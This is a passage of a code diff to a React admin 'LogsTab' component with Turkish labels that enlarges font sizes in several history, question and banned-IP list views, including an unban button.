-                                  <span className={`text-[10px] font-bold uppercase w-8 h-8 rounded-lg flex items-center justify-center shrink-0 ${darkMode ? 'bg-purple-500/15 text-purple-400' : 'bg-purple-500/10 text-purple-600'}`}>
+                                  <span className={`text-[12px] font-bold uppercase w-8 h-8 rounded-lg flex items-center justify-center shrink-0 ${darkMode ? 'bg-purple-500/15 text-purple-400' : 'bg-purple-500/10 text-purple-600'}`}>
                                     #{cHistory.length - idx}
                                   </span>
                                   <div className="min-w-0">
-                                    <p className={`text-[10px] ${darkMode ? 'text-zinc-500' : 'text-gray-500'}`}>
+                                    <p className={`text-[12px] ${darkMode ? 'text-zinc-500' : 'text-gray-500'}`}>
                                       {fmtDate(r.submittedAt)}
                                     </p>
                                   </div>
@@ -3128,7 +3141,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                     <div className="flex items-center gap-2 mb-4">
                       <span className="text-xl">🔐</span>
                       <h4 className={`text-base font-bold ${darkMode ? 'text-white' : 'text-gray-900'}`}>Autenticação (Geçmiş)</h4>
-                      <span className={`text-[10px] font-bold px-2 py-0.5 rounded-full ${darkMode ? 'bg-white/10 text-zinc-400' : 'bg-gray-200 text-gray-600'}`}>
+                      <span className={`text-[12px] font-bold px-2 py-0.5 rounded-full ${darkMode ? 'bg-white/10 text-zinc-400' : 'bg-gray-200 text-gray-600'}`}>
                         {gHistory.length} adet
                       </span>
                     </div>
@@ -3156,14 +3169,14 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                             >
                               <div className={`px-4 py-3 flex items-center justify-between gap-3 border-b ${darkMode ? 'border-white/10 bg-white/5' : 'border-gray-200 bg-white'}`}>
                                 <div className="flex items-center gap-2 min-w-0">
-                                  <span className={`text-[10px] font-bold uppercase w-8 h-8 rounded-lg flex items-center justify-center shrink-0 ${darkMode ? 'bg-rose-500/15 text-rose-400' : 'bg-rose-500/10 text-rose-600'}`}>
+                                  <span className={`text-[12px] font-bold uppercase w-8 h-8 rounded-lg flex items-center justify-center shrink-0 ${darkMode ? 'bg-rose-500/15 text-rose-400' : 'bg-rose-500/10 text-rose-600'}`}>
                                     #{gHistory.length - idx}
                                   </span>
                                   <div className="min-w-0">
                                     <p className={`text-[12px] font-bold truncate ${darkMode ? 'text-white' : 'text-gray-900'}`}>
                                       {genLabel}
                                     </p>
-                                    <p className={`text-[10px] ${darkMode ? 'text-zinc-500' : 'text-gray-500'}`}>
+                                    <p className={`text-[12px] ${darkMode ? 'text-zinc-500' : 'text-gray-500'}`}>
                                       {fmtDate(r.submittedAt)}
                                     </p>
                                   </div>
@@ -3391,8 +3404,8 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                 ) : ordered.map(({ q, i }) => (
                   <div key={i} className={`rounded-xl border p-4 ${darkMode ? 'border-zinc-800 bg-zinc-900/50' : 'border-gray-200 bg-gray-50'}`}>
                     <div className="flex items-center justify-between gap-2 mb-2">
-                      <span className={`text-[10px] font-bold uppercase tracking-widest ${darkMode ? 'text-violet-400' : 'text-violet-600'}`}>Soru #{i + 1}</span>
-                      <span className={`text-[10px] ${darkMode ? 'text-zinc-500' : 'text-gray-400'}`}>{q.askedAt ? fmtDate(q.askedAt) : ""}</span>
+                      <span className={`text-[12px] font-bold uppercase tracking-widest ${darkMode ? 'text-violet-400' : 'text-violet-600'}`}>Soru #{i + 1}</span>
+                      <span className={`text-[12px] ${darkMode ? 'text-zinc-500' : 'text-gray-400'}`}>{q.askedAt ? fmtDate(q.askedAt) : ""}</span>
                     </div>
                     <p className={`text-sm font-semibold mb-2 ${darkMode ? 'text-white' : 'text-gray-900'}`}>{q.question || "-"}</p>
                     {q.answer && String(q.answer).trim() ? (
@@ -3486,13 +3499,13 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                 </div>
                 <div>
                   <h3 className={`text-lg font-black tracking-tight ${darkMode ? 'text-white' : 'text-gray-900'}`}>Banlanan IP Adresleri</h3>
-                  <p className={`text-[11px] opacity-70 mt-0.5 ${darkMode ? 'text-zinc-400' : 'text-gray-500'}`}>Toplam {bannedList.length} adet engellenmiş IP • İstediğini kaldırabilirsin</p>
+                  <p className={`text-[13px] opacity-70 mt-0.5 ${darkMode ? 'text-zinc-400' : 'text-gray-500'}`}>Toplam {bannedList.length} adet engellenmiş IP • İstediğini kaldırabilirsin</p>
                 </div>
               </div>
               <div className="flex items-center gap-2">
                 <button
                   onClick={() => void loadBannedList()}
-                  className={`flex items-center gap-1.5 rounded-full px-3.5 py-1.5 text-[10px] font-bold uppercase tracking-wider transition-all hover:scale-105 ${darkMode ? 'bg-white/5 border border-white/10 text-gray-300 hover:text-white hover:bg-white/10' : 'bg-gray-50 border border-gray-200 text-gray-600 hover:bg-gray-100 hover:text-black'}`}
+                  className={`flex items-center gap-1.5 rounded-full px-3.5 py-1.5 text-[12px] font-bold uppercase tracking-wider transition-all hover:scale-105 ${darkMode ? 'bg-white/5 border border-white/10 text-gray-300 hover:text-white hover:bg-white/10' : 'bg-gray-50 border border-gray-200 text-gray-600 hover:bg-gray-100 hover:text-black'}`}
                   title="Listeyi yenile"
                 >
                   <svg className="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" /></svg>
@@ -3519,7 +3532,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                 <div className={`p-12 text-center rounded-none border-t-0 border-x-0 border-b-0 border-2 border-dashed m-4 rounded-3xl ${darkMode ? 'border-white/10 text-zinc-500' : 'border-gray-200 text-gray-400'}`}>
                   <svg className="w-12 h-12 mx-auto mb-3 opacity-50" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.5} d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" /></svg>
                   <p className="text-[13px] font-black uppercase tracking-wider mb-1">Henüz banlanmış IP yok</p>
-                  <p className="text-[11px] opacity-70">Sistemden IP engellediğinizde kayıtlar burada listelenecek</p>
+                  <p className="text-[13px] opacity-70">Sistemden IP engellediğinizde kayıtlar burada listelenecek</p>
                 </div>
               )}
 
@@ -3536,18 +3549,18 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                           <span className={`font-mono font-black text-[15px] tracking-wider ${darkMode ? 'text-red-400' : 'text-red-600'}`}>
                             {ban.ip_address || "IP bilgisi yok"}
                           </span>
-                          <span className={`inline-flex items-center rounded-full px-2 py-0.5 text-[9px] font-black uppercase tracking-wider whitespace-nowrap ${darkMode ? 'bg-red-500/10 text-red-400 border border-red-500/20' : 'bg-red-50 text-red-600 border border-red-100'}`}>
+                          <span className={`inline-flex items-center rounded-full px-2 py-0.5 text-[11px] font-black uppercase tracking-wider whitespace-nowrap ${darkMode ? 'bg-red-500/10 text-red-400 border border-red-500/20' : 'bg-red-50 text-red-600 border border-red-100'}`}>
                             🔒 Engelli
                           </span>
                         </div>
                         {ban.reason && (
-                          <div className={`text-[11px] opacity-80 leading-snug whitespace-normal break-words ${darkMode ? 'text-zinc-400' : 'text-gray-600'}`}>
+                          <div className={`text-[13px] opacity-80 leading-snug whitespace-normal break-words ${darkMode ? 'text-zinc-400' : 'text-gray-600'}`}>
                             <span className="font-bold uppercase tracking-wider opacity-70 mr-1">Neden:</span>
                             {ban.reason}
                           </div>
                         )}
                         {(ban.banned_at || ban.created_at) && (
-                          <div className={`text-[10px] opacity-60 font-mono mt-1 ${darkMode ? 'text-zinc-500' : 'text-gray-500'}`}>
+                          <div className={`text-[12px] opacity-60 font-mono mt-1 ${darkMode ? 'text-zinc-500' : 'text-gray-500'}`}>
                             📅 {new Date(ban.banned_at || ban.created_at).toLocaleString('tr-TR')}
                           </div>
                         )}
@@ -3556,7 +3569,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                       {/* UNBAN BUTONU */}
                       <button
                         onClick={() => void handleUnban(ban.ip_address)}
-                        className="shrink-0 flex items-center gap-1.5 rounded-xl px-4 py-2 text-[11px] font-black uppercase tracking-wider transition-all hover:scale-105 active:scale-95 bg-green-500/10 text-green-600 dark:text-green-400 hover:bg-green-500 hover:text-white border border-green-500/20"
+                        className="shrink-0 flex items-center gap-1.5 rounded-xl px-4 py-2 text-[13px] font-black uppercase tracking-wider transition-all hover:scale-105 active:scale-95 bg-green-500/10 text-green-600 dark:text-green-400 hover:bg-green-500 hover:text-white border border-green-500/20"
                         title="Bu IP yasağını kaldır"
                       >
                         <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13.828 10.172a4 4 0 00-5.656 0l-4 4a4 4 0 105.656 5.656l1.102-1.101m-.758-4.899a4 4 0 005.656 0l4-4a4 4 0 00-5.656-5.656l-1.1 1.1" /></svg>
